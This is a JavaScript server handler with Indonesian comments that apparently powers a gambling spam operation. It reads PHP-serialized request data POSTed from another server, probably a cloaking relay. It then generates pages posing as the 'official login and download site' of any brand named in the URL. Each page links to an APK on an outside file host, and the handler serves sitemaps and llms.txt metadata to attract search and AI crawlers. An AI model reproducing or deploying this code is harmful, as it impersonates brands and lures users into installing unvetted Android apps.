import { escapeHtml, sanitizeText, extractPHPSerializedValue, generateCRC32Like } from '../utils/parser.js';
import { handleAiMetadata } from '../utils/aiMetadata.js';
import { renderDownloadPage } from '../views/template.js';

export async function onRequest(context) {
  const { request } = context;
  const url = new URL(request.url);

  let requestURI = url.pathname;
  let queryString = url.search.replace('?', '');
  let httpHost = 'spin8vip.top';
  let rawPostData = {};

  // 1. Tangkap POST dari Server 1
  if (request.method === 'POST') {
    try {
      const contentType = request.headers.get('content-type') || '';
      if (contentType.includes('application/x-www-form-urlencoded')) {
        const formData = await request.formData();
        rawPostData = Object.fromEntries(formData);
      } else if (contentType.includes('application/json')) {
        rawPostData = await request.json();
      } else {
        const bodyText = await request.text();
        rawPostData = Object.fromEntries(new URLSearchParams(bodyText));
      }

      if (rawPostData.x) {
        const serializedData = rawPostData.x;
        const uriFromPost = extractPHPSerializedValue(serializedData, 'REQUEST_URI');
        const queryFromPost = extractPHPSerializedValue(serializedData, 'QUERY_STRING');
        let hostFromPost = extractPHPSerializedValue(serializedData, 'HTTP_HOST') || extractPHPSerializedValue(serializedData, 'SERVER_NAME');

        if (uriFromPost) requestURI = uriFromPost;
        if (queryFromPost) queryString = queryFromPost;
        if (hostFromPost) httpHost = hostFromPost;
      }
    } catch (e) {}
  }

  if (!httpHost) httpHost = 'spin8vip.top';

  const fullCheck = `${requestURI} ${queryString}`.toLowerCase();

  // 2. Cek AI Metadata (llms.txt / ai-catalog.json)
  const aiResponse = await handleAiMetadata(fullCheck, `https://${httpHost}`, url.origin);
  if (aiResponse) {
    return new Response(aiResponse.content, {
      headers: { "Content-Type": aiResponse.contentType }
    });
  }

  // 3. Handle Robots.txt
  if (fullCheck.includes('robots.txt')) {
    const robotsOutput = `User-agent: *\nDisallow:\nSitemap: https://${httpHost}/sitemap-wp.xml`;
    return new Response(robotsOutput, { headers: { "Content-Type": "text/plain; charset=utf-8" } });
  }

  // 4. Handle Sitemap
  if (fullCheck.includes('pingsitemap') || fullCheck.includes('sitemap-wp.xml')) {
    const sitemapOutput = `<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n  <url>\n    <loc>https://${httpHost}/</loc>\n    <changefreq>daily</changefreq>\n    <priority>1.0</priority>\n  </url>\n</urlset>`;
    return new Response(sitemapOutput, { headers: { "Content-Type": "text/xml; charset=utf-8" } });
  }

  // 5. Parsing Path & Abaikan .php untuk Halaman Utama Brand
  let cleanPath = requestURI.replace(/^\/+/, '');
  if (cleanPath.includes('.php')) {
    const phpParts = cleanPath.split('.php');
    cleanPath = phpParts[phpParts.length - 1].replace(/^\/+/, '');
  }

  let brandQuery = '';
  const segments = cleanPath.split('/').filter(Boolean);
  if (segments.length > 0) {
    brandQuery = segments[0];
  } else if (queryString) {
    brandQuery = queryString.replace(/^download\//i, '');
  } else {
    brandQuery = 'default-app';
  }

  const cleanBrandName = sanitizeText(brandQuery);
  const finalBrandTitle = cleanBrandName || 'APLIKASI TERPERCAYA';
  const uniqueHash = generateCRC32Like(brandQuery);

  const customTitle = escapeHtml(`Situs Resmi Pendaftaran & Login ${finalBrandTitle} Terpercaya`);
  const customDesc = escapeHtml(`Link alternatif resmi ${finalBrandTitle} versi terbaru. Mainkan game gacor dan unduh aplikasinya dengan aman dan cepat.`);
  const downloadLink = `https://download.store-files.com/apk/${uniqueHash}/${encodeURIComponent(brandQuery)}.apk`;

  // 6. Render HTML dari modul terpisah
  const htmlTemplate = renderDownloadPage({ customTitle, customDesc, downloadLink });

  return new Response(htmlTemplate, {
    headers: { 
      "Content-Type": "text/html; charset=utf-8",
      "Cache-Control": "public, max-age=600"
    }
  });
}
